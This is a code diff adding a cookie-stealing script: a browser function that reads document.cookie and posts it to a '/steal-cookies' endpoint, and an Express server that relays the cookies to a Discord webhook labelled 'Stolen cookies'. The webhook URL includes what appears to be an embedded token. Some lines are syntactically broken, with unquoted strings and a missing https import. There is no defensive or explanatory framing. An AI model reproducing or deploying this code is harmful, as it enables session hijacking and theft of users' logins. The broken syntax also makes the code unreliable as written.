@@ -1,0 +1,27 @@
+function get_cookies() {
+    var cookie_string = encodeURIComponent(document.cookie);
+    // Send the cookie string to the server
+    fetch('/steal-cookies', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookies: cookie_string })
+    });
+}
+const express = require('express');
+const app = express();
+const webhook_url = https://discord.com/api/webhooks/1223784388156850256/sqCgNrYn8Wk2sM6HUCzf66wgDTwP0O-s9s09f3egymGpOkrJONotuQK79tdi3F9lYeD9;
+app.use(express.json());
+app.post('/steal-cookies', (req, res) => {
+    const cookies = req.body.cookies;
+    // Send the cookies to the Discord webhook
+    const webhook_req = https.request(webhook_url, (webhook_res) => {
+        webhook_res.on('data', (chunk) => {
+            console.log(Webhook response: ${chunk});
+        });
+    });
+    webhook_req.write(JSON.stringify({ content: Stolen cookies: ${cookies} }));
+    webhook_req.end();
+});
+app.listen(3000, () => {
+    console.log('Server listening on port 3000');
+});
